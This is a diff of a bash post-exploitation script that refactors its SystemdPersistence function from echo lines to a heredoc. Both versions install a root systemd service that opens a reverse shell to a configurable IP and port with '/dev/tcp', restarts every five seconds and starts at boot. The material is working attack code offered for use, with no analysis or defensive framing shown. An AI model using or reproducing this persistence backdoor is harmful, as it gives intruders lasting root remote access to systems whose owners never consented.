@@ -49,20 +49,23 @@ done
 echo -ne "\n"
 
 function SystemdPersistence () {
-	 echo "[Unit]" > /etc/systemd/system/persistence.service
-	 echo "Description= Systemd Persistence" >> /etc/systemd/system/persistence.service
-	 echo "" >> /etc/systemd/system/persistence.service
-	 echo "[Service]" >> /etc/systemd/system/persistence.service
-	 echo "User=root" >> /etc/systemd/system/persistence.service
-	 echo "Group=root" >> /etc/systemd/system/persistence.service
-	 echo "WorkingDirectory=/root" >> /etc/systemd/system/persistence.service
-	 echo "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/systemd/system/persistence.service
-	 echo "Restart=always" >> /etc/systemd/system/persistence.service
-	 echo "RestartSec=5" >> /etc/systemd/system/persistence.service
-	 echo "" >> /etc/systemd/system/persistence.service
-	 echo "[Install]" >> /etc/systemd/system/persistence.service
-	 echo "WantedBy=multi-user.target" >> /etc/systemd/system/persistence.service
+    cat <<EOF > /etc/systemd/system/persistence.service
+[Unit]
+Description= Systemd Persistence
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=/root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
 }
+
 
 message="[*] setup completed! [*]"
 
